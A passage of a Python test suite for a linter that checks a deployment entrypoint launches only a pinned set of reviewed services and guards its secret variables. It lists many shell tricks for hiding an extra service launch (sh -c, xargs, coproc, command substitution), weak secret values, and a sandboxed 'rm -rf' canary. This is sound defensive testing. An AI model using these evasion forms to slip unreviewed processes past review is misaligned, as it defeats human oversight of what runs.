    return next(r for r in lint.analyse(root, behavioural=True) if r.topology.id == "fly")


def _fly_red(rep):
    return bool(rep.findings) or rep.vars[SV].status != lint.ARMED or rep.vars[DV].status != lint.ARMED


def test_the_reviewed_service_set_is_pinned_exactly():
    assert lint.EXPECTED_FLY_STUBS == (
        "registry", "ledger", "delegation", "sentinel", "killswitch", "governor", "replay",
        "forcegw", "fedbroker", "console", "crosswalk", "lifecycle", "attest", "caddy",
    )
    assert lint.scan_commands(REAL_ENTRY).services == list(lint.EXPECTED_FLY_STUBS)
    assert lint.scan_commands(REAL_ENTRY).utilities == ["mkdir"]
    assert lint.scan_commands(REAL_ENTRY).indirect == []


def test_a_launch_dropped_from_the_script_is_a_finding(bash, tmp_path):
    no_attest = "\n".join(l for l in _arm(REAL_ENTRY).splitlines() if not l.startswith("attest serve")) + "\n"
    rep = _fly_report(tmp_path, no_attest)
    assert any("launches 13 services" in f and "attest" in f for f in rep.findings), rep.findings


def test_a_launch_the_lint_does_not_see_is_reported_as_a_missing_command(bash, monkeypatch):
    real_scan = lint.scan_commands

    def blind(text):
        s = real_scan(text)
        s.services = [n for n in s.services if n != "attest"]
        return s

    monkeypatch.setattr(lint, "scan_commands", blind)
    lint._RUN_CACHE.clear()
    r = lint.run_entrypoint(_arm(REAL_ENTRY))
    lint._RUN_CACHE.clear()
    assert any("missing or unrunnable command" in f for f in r.findings), r.findings


def test_a_stub_that_ran_from_outside_the_stub_directory_is_a_finding(bash, monkeypatch):
    monkeypatch.setattr(lint, "_STUB", lint._STUB.replace('"$0"', "/elsewhere/stub"))
    lint._RUN_CACHE.clear()
    r = lint.run_entrypoint(_arm(REAL_ENTRY))
    lint._RUN_CACHE.clear()
    assert any("outside the stub directory" in f for f in r.findings), r.findings


@pytest.mark.parametrize("name,txt", [
    ("U01 absolute path", "/nonexistent/newsvc serve &\n"),
    ("U02 variable command", "BIN=/nonexistent/newsvc\n$BIN serve &\n"),
    ("U03 quoted absolute path", '"/nonexistent/newsvc" serve &\n'),
    ("U04 command -v && svc", "command -v newsvc >/dev/null && newsvc serve &\n"),
    ("U05 nohup", "nohup newsvc serve &\n"),
    ("U06 setsid", "setsid newsvc serve &\n"),
    ("U07 timeout", "timeout 5 newsvc serve &\n"),
    ("U08 xargs placeholder", "echo newsvc | xargs -I{} {} serve &\n"),
    ("U08b xargs direct", "echo serve | xargs newsvc &\n"),
    ("U09 function wrapper", "launch() { newsvc serve; }\nlaunch &\n"),
    ("U10 sh -c", "sh -c 'newsvc serve' &\n"),
    ("U11 /usr/bin/env", "/usr/bin/env newsvc serve &\n"),
    ("U13 command substitution", "$(command -v newsvc) serve &\n"),
    ("U14 default expansion", '"${BIN:-newsvc}" serve &\n'),
    ("U15 cd and ./svc", "( cd /nonexistent && ./newsvc serve ) &\n"),
    ("U16 empty variable prefix", "env_wrap=; $env_wrap newsvc serve &\n"),
    ("U19 assignment prefix", "X=1 newsvc serve &\n"),
    ("U20 coproc", "coproc newsvc serve\n"),
    ("U21 brace group", "{ newsvc serve; } &\n"),
    ("U22 if then", "if true; then newsvc serve & fi\n"),
    ("U23 for one-liner", "for i in 1; do newsvc serve & done\n"),
    ("U24 and chain", "true && newsvc serve &\n"),
])
def test_unstubbed_or_extra_launches_are_red(bash, tmp_path, name, txt):
    rep = _fly_report(tmp_path, _arm(_top(REAL_ENTRY, txt)))
    assert _fly_red(rep), (name, rep.findings)


def test_a_loop_that_hides_the_service_names_is_red(bash, tmp_path):
    lines = [l for l in _arm(REAL_ENTRY).splitlines()
             if not re.match(r"^(?:FIELD_\w+=(?:\"[^\"]*\"|\S+) )*(registry|ledger|delegation|sentinel|killswitch|governor|replay|forcegw|fedbroker|console|crosswalk|lifecycle|attest) serve ", l)]
    loop = 'for s in registry ledger delegation sentinel killswitch governor replay forcegw fedbroker console crosswalk lifecycle attest; do\n  "$s" serve --host 127.0.0.1 &\ndone\n'
    text = "\n".join(lines).replace("caddy run", loop + "caddy run", 1) + "\n"
    rep = _fly_report(tmp_path, text)
    assert _fly_red(rep), rep.findings


def test_utilities_are_no_ops_and_the_run_cannot_write_outside_its_temp_dir(bash, tmp_path):
    canary = tmp_path / "CANARY_FROM_LINT"
    rel = Path("canary_relative_from_lint")
    rel.unlink(missing_ok=True)
    text = _arm(_top(REAL_ENTRY, f"touch '{canary.as_posix()}'\nrm -rf '{tmp_path.as_posix()}/nothing'\necho x > ./{rel}\n"))
    r = lint.run_entrypoint(text)
    try:
        assert r.ran, r.reason
        assert not canary.exists(), "touch ran for real"
        assert not rel.exists(), "a relative write reached the working directory of the caller"
    finally:
        rel.unlink(missing_ok=True)


@pytest.mark.parametrize("name,after_s,after_d", [
    ("V01 literal after guard", "export FIELD_SHARED_SECRET=hunter2\n", ""),
    ("V02 space", "export FIELD_SHARED_SECRET=' '\n", ""),
    ("V03 first character", 'export FIELD_SHARED_SECRET="${FIELD_SHARED_SECRET:0:1}"\n', ""),
    ("V06 placeholder", "export FIELD_SHARED_SECRET=changeme\n", ""),
    ("V07 x", 'export FIELD_SHARED_SECRET="x"\n', ""),
    ("V08 literal reference", "export FIELD_SHARED_SECRET='${FIELD_SHARED_SECRET}'\n", ""),
    ("V09 pid", "export FIELD_SHARED_SECRET=$$\n", ""),
    ("V04 roster space", "", 'export FIELD_DOA_ROSTER=" "\n'),
    ("V05 roster missing path", "", "export FIELD_DOA_ROSTER=/nonexistent\n"),
])
def test_a_rewritten_but_non_empty_value_is_red(bash, tmp_path, name, after_s, after_d):
    r = lint.run_entrypoint(_arm(REAL_ENTRY, after_s=after_s, after_d=after_d))
    assert r.findings, name


STRONG_ROSTER = GUARD_D  # refuses unset, empty and whitespace-only


@pytest.mark.parametrize("var,guard,expect_open", [
    # each guard refuses ONE of the four conditions only, so each scenario is needed to see the gap
    ("secret", ': "${FIELD_SHARED_SECRET?set}"\n', True),                             # no colon: empty passes
    ("secret", '[ "${FIELD_SHARED_SECRET-x}" != "" ] || exit 1\n', True),             # unset passes
    ("roster", ': "${FIELD_DOA_ROSTER?set}"\n', True),
    ("roster", '[ "${FIELD_DOA_ROSTER-x}" != "" ] || exit 1\n', True),
    ("secret", GUARD_S, False),
    ("roster", GUARD_D, False),
])
def test_each_of_the_four_refusal_scenarios_is_needed(bash, var, guard, expect_open):
    kwargs = {"guard_s": guard} if var == "secret" else {"guard_d": guard}
    r = lint.run_entrypoint(_arm(REAL_ENTRY, **kwargs))
    key = SV if var == "secret" else DV
    assert (r.status[key] == lint.EMPTY) is expect_open, (guard, r.status)


def test_a_colon_less_guard_is_open_for_the_empty_value(bash):
    r = lint.run_entrypoint(_arm(REAL_ENTRY, guard_s=': "${FIELD_SHARED_SECRET?set}"\n'))
    assert r.status[SV] == lint.EMPTY and r.status[DV] == lint.ARMED


def test_a_roster_guard_that_passes_a_blank_value_is_a_finding(bash):
    weak = lint.run_entrypoint(_arm(REAL_ENTRY, guard_d=': "${FIELD_DOA_ROSTER:?set}"\n'))
    assert weak.status[DV] == lint.ARMED
    assert any("whitespace-only" in f and "roster gate is OFF" in f for f in weak.findings), weak.findings
    strong = lint.run_entrypoint(_arm(REAL_ENTRY))
    assert strong.findings == [] and any("secret blank" in n for n in strong.notes)


def test_the_shipped_script_is_not_flagged_for_blank_values_because_it_is_already_open(bash):
    assert lint.run_entrypoint(REAL_ENTRY).findings == []


# --- CI flake: ETXTBSY from writing stubs while another scenario thread forks ---------
# On Linux a fork copies every fd the process has open. When one scenario thread forked
# while another was still writing a stub, the child held that stub open for writing until
# it exec'd, and running the stub then failed with ETXTBSY: "bad interpreter: Text file
# busy", exit 126, reported as a service that never started (a false finding).


@pytest.mark.skipif(not sys.platform.startswith("linux"), reason=(
    "ETXTBSY is Linux exec semantics (the CI runners are Linux); Windows and Git bash run a "
    "script that is open for writing, so the hazard cannot be reproduced on this platform"))
def test_linux_refuses_to_run_a_stub_that_is_open_for_writing_anywhere(bash, tmp_path):
    """The mechanism behind the flake, reproduced deterministically: a stub that is open
    for writing in another thread, or only in a child that inherited the fd, cannot be
    exec'd; once every writer is gone it runs."""
    import threading

    sdir = tmp_path / "stubs"
    sdir.mkdir()
    stub = sdir / "mkdir"
    stub.write_text(lint._UTILITY_STUB.replace("NAME", "mkdir"), encoding="utf-8", newline="\n")
    stub.chmod(0o755)
    env = {"PATH": sdir.as_posix(), "STUB_LOG": (tmp_path / "stub.log").as_posix()}

    def run_stub():
        return subprocess.run([bash, "-c", "mkdir x"], env=env, cwd=str(tmp_path), capture_output=True, text=True, timeout=30)

    assert run_stub().returncode == 0
    opened, release = threading.Event(), threading.Event()

    def writer():
        with open(stub, "a", encoding="utf-8"):
            opened.set()
            release.wait(30)

    t = threading.Thread(target=writer)
    t.start()
    try:
        assert opened.wait(30)
        r = run_stub()
    finally:
        release.set()
        t.join(30)
    assert r.returncode == 126 and "bad interpreter: Text file busy" in r.stderr, (r.returncode, r.stderr)
    fd = os.open(stub, os.O_WRONLY)
    holder = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"], pass_fds=(fd,))
    os.close(fd)  # the only writer left is the child's inherited copy
    try:
        r = run_stub()
    finally:
        holder.kill()
        holder.wait(30)
    assert r.returncode == 126 and "bad interpreter: Text file busy" in r.stderr, (r.returncode, r.stderr)
    assert run_stub().returncode == 0


def test_every_stub_is_written_and_closed_on_the_calling_thread_before_any_scenario_starts(bash, monkeypatch):
    """The fix: no file is open for writing while a scenario process can fork, so the
    race above cannot happen (deterministic on every platform)."""
    import pathlib
    import threading

    events, lock = [], threading.Lock()
    real_write_text, real_popen = pathlib.Path.write_text, subprocess.Popen

    def write_text(self, *a, **k):
        n = real_write_text(self, *a, **k)  # returns once the file is closed
        with lock:
            events.append(("write", threading.get_ident(), self.as_posix()))
        return n

    class RecordingPopen(real_popen):
        def __init__(self, args, *a, **k):
            if str(args[-1]).endswith("/entrypoint.sh"):
                with lock:
                    events.append(("popen", threading.get_ident(), str(args[-1])))
            super().__init__(args, *a, **k)

    monkeypatch.setattr(pathlib.Path, "write_text", write_text)
    monkeypatch.setattr(subprocess, "Popen", RecordingPopen)
    r = lint.run_entrypoint(REAL_ENTRY)
    assert r.ran and r.findings == [], (r.reason, r.findings)
    scan = lint.scan_commands(REAL_ENTRY)
    writes = [i for i, e in enumerate(events) if e[0] == "write" and "/topology-lint-" in e[2]]
    stub_writes = [i for i in writes if "/stubs/" in events[i][2]]
    popens = [i for i, e in enumerate(events) if e[0] == "popen"]
    assert len(popens) == len(lint._SCENARIOS)
    assert len(stub_writes) == len(lint._SCENARIOS) * (len(scan.services) + len(scan.utilities))
    assert {events[i][1] for i in writes} == {threading.get_ident()}, "a scenario file was written on a worker thread"
    assert max(writes) < min(popens), "a scenario file was written after a scenario process started"


def test_behavioural_off_in_ci_is_a_failure_and_outside_ci_a_loud_warning(capsys, monkeypatch):
    for value in ("0", "false", ""):
        monkeypatch.setenv("TOPOLOGY_LINT_BEHAVIOURAL", value)
        monkeypatch.setenv("CI", "true")
        assert lint.main(["--root", str(REPO), "--today", "2026-10-23"]) == 1, value
        out = capsys.readouterr().out
        assert "cannot be turned off in CI" in out
        monkeypatch.delenv("CI")
        assert lint.main(["--root", str(REPO), "--today", "2026-10-23"]) == 0, value
        out = capsys.readouterr().out
        assert "WARN entrypoint behavioural check NOT RUN" in out and "only tripwire-checked" in out


def test_missing_bash_outside_ci_prints_the_warning(capsys, monkeypatch):
    monkeypatch.setenv("TOPOLOGY_LINT_BEHAVIOURAL", "1")
    monkeypatch.setattr(lint, "find_bash", lambda: None)
    assert lint.main(["--root", str(REPO), "--today", "2026-10-23"]) == 0
    assert "WARN entrypoint behavioural check NOT RUN (no bash found)" in capsys.readouterr().out


def test_the_test_module_does_not_leak_the_variable_to_the_process():
    # the autouse fixture sets it per test through monkeypatch; at import time nothing is set
    assert os.environ.get("TOPOLOGY_LINT_BEHAVIOURAL") == "0"  # set by the fixture for THIS test only


def test_cli_asserts_the_exact_stub_count(bash, capsys, monkeypatch):
    monkeypatch.setenv("TOPOLOGY_LINT_BEHAVIOURAL", "1")
    assert lint.main(["--root", str(REPO), "--today", "2026-10-23"]) == 0
    assert "entrypoint behavioural check: RAN (14 service stubs, 9 scenarios)" in capsys.readouterr().out


def test_a_bash_that_does_not_honour_a_restricted_path_is_refused(bash, monkeypatch):
    monkeypatch.setitem(lint._PATH_PROBE, bash, False)
    r = lint.run_entrypoint(_arm(REAL_ENTRY), bash=bash)
    assert not r.ran and "adds its own directories to PATH" in r.reason and not r.refused
